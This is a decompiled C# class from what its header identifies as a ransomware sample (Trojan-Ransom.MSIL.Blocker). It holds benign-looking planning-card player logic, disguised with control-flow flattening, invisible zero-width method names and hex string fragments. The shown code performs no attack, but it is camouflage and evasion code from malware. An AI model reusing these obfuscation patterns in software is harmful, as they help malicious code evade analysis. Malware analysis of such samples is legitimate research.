// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: IClientChannelSinkSta, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: C2D4B9C8-45F5-4E7C-86BD-063D9CE5A365
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-99250ea1c22dd16f0bf3599be77d252894c810eeab2c318fa9de843f19fdd48c.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = 1393705223;
      string str1;
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 250202363)) % 8U)
        {
          case 0:
            str2 = str1;
            num1 = 431415970;
            continue;
          case 2:
            int num3;
            num1 = num3 = BaseStream != 1 ? 1610887259 : (num3 = 831771356);
            continue;
          case 3:
            int num4 = flag ? -1343029049 : (num4 = -1826565104);
            num1 = num4 ^ (int) num2 * -1657954317;
            continue;
          case 4:
            str1 = (string) null;
            flag = BaseStream == 0;
            num1 = (int) num2 * -1313640037 ^ -184990940;
            continue;
          case 5:
            str1 = "4942696E6443";
            num1 = (int) num2 * 429278205 ^ 590556034;
            continue;
          case 6:
            goto label_1;
          case 7:
            str1 = "326E46";
            num1 = (int) num2 * -469497045 ^ 1832526294;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = -374202240;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ -494287468)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num3 * 1934248962 ^ -1447117541;
            continue;
          case 3:
            num4 = 0;
            break;
          case 4:
            if (this.PlanningCards.Length == 0)
            {
              num1 = (int) num3 * 852628216 ^ 462186252;
              continue;
            }
            num4 = this.PlanningCards[cardTypeIndex];
            break;
          default:
            goto label_9;
        }
        num2 = num4;
        num1 = -660702412;
      }
label_9:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = 852960303;
        int num2;
        int index;
        int[] planningCards;
        int planningCardsCount;
        int num3;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ 525279318)) % 12U)
          {
            case 0:
              ++index;
              num1 = 567106445;
              continue;
            case 1:
              num2 = 0;
              num1 = (int) num4 * -1422826677 ^ -1842175875;
              continue;
            case 2:
              goto label_1;
            case 3:
              int num5;
              num1 = num5 = index >= planningCards.Length ? 1735853758 : (num5 = 1182329899);
              continue;
            case 4:
              planningCards = this.PlanningCards;
              num1 = (int) num4 * 1274178659 ^ 1825929527;
              continue;
            case 5:
              num3 = planningCards[index];
              num1 = 361585760;
              continue;
            case 6:
              ++num2;
              num1 = (int) num4 * -1929438635 ^ -187774972;
              continue;
            case 7:
              int num6 = num3 > 0 ? 147169490 : (num6 = 1470792792);
              num1 = num6 ^ (int) num4 * 229814618;
              continue;
            case 8:
              planningCardsCount = num2;
              num1 = (int) num4 * 951033895 ^ -1467187911;
              continue;
            case 9:
              index = 0;
              num1 = (int) num4 * 1997114985 ^ 1423884700;
              continue;
            case 10:
              num1 = (int) num4 * -497652597 ^ 1385121767;
              continue;
            default:
              goto label_13;
          }
        }
label_13:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = -43635436;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -622818749)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1162299003 ^ -1958748365;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = -760875056;
      int index;
      int planningCard;
      bool flag1;
      string str1;
      bool flag2;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -246342953)) % 16U)
        {
          case 0:
            str1 = Player.\u200C‪‏‍‌‪⁫‬⁬‮‬⁭‮‏‭‏⁫‫⁬⁫⁭‫⁮⁫‬⁫‭‮⁮⁭​‮⁮​‮‏‌‏‌‏‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -2010248015;
            continue;
          case 2:
            num1 = (int) num2 * 1125730916 ^ 498986302;
            continue;
          case 3:
            int num3 = flag1 ? -1610993031 : (num3 = -277012159);
            num1 = num3 ^ (int) num2 * -615940622;
            continue;
          case 4:
            index = 0;
            num1 = (int) num2 * -792919611 ^ 1318242310;
            continue;
          case 5:
            num1 = (int) num2 * 281013687 ^ 359772687;
            continue;
          case 6:
            ++index;
            num1 = -751065364;
            continue;
          case 7:
            str1 = " ";
            num1 = (int) num2 * 1219690341 ^ 1058085248;
            continue;
          case 8:
            num1 = (int) num2 * -164232413 ^ 44912697;
            continue;
          case 9:
            goto label_1;
          case 10:
            str2 = str1;
            num1 = (int) num2 * 251874768 ^ 1118786789;
            continue;
          case 11:
            flag2 = index < this.PlanningCards.Length;
            num1 = -1401479110;
            continue;
          case 12:
            num1 = -1224592616;
            continue;
          case 13:
            int num4 = !flag2 ? -1973894540 : (num4 = -2058929854);
            num1 = num4 ^ (int) num2 * -1174988947;
            continue;
          case 14:
            flag1 = planningCard == 0;
            num1 = (int) num2 * -562345089 ^ -539594426;
            continue;
          case 15:
            planningCard = this.PlanningCards[index];
            num1 = (int) num2 * -749147738 ^ -2003069741;
            continue;
          default:
            goto label_17;
        }
      }
label_17:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = -1567209182;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -421907725)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * 1313702219 ^ -1621806634;
            continue;
          case 2:
            num1 = (int) num2 * 1119281848 ^ 1116888812;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = 1952159690;
      int[] numArray;
      int aIndex;
      int count;
      bool flag;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1669080936)) % 9U)
        {
          case 0:
            flag = aIndex < count;
            num1 = 132418425;
            continue;
          case 1:
            count = json.Count;
            num1 = (int) num2 * 906340578 ^ 1098268674;
            continue;
          case 2:
            planningCards = numArray;
            num1 = (int) num2 * 154559920 ^ 276786434;
            continue;
          case 4:
            numArray[aIndex] = json[aIndex].AsInt;
            ++aIndex;
            num1 = 1808552061;
            continue;
          case 5:
            goto label_1;
          case 6:
            int num3 = !flag ? 1577910475 : (num3 = 1049249947);
            num1 = num3 ^ (int) num2 * 196985804;
            continue;
          case 7:
            numArray = new int[count];
            aIndex = 0;
            num1 = (int) num2 * 2042405934 ^ 1960446905;
            continue;
          case 8:
            num1 = (int) num2 * -1984399707 ^ 947943393;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = 1144976371;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 249810890)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            str = Player.\u200D‍⁪‎‏‍‪‎‌‌‏‪⁫‪​⁬‏⁭‏⁯‏⁬​‭‫‌‫‫‎‏‭‎⁯⁬‪⁬‪‎‪‪‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * -609074072 ^ -194771807;
            continue;
          case 3:
            num1 = (int) num2 * -1502971205 ^ 1882043473;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u200C‪‏‍‌‪⁫‬⁬‮‬⁭‮‏‭‏⁫‫⁬⁫⁭‫⁮⁫‬⁫‭‮⁮⁭​‮⁮​‮‏‌‏‌‏‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200D‍⁪‎‏‍‪‎‌‌‏‪⁫‪​⁬‏⁭‏⁯‏⁬​‭‫‌‫‫‎‏‭‎⁯⁬‪⁬‪‎‪‪‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
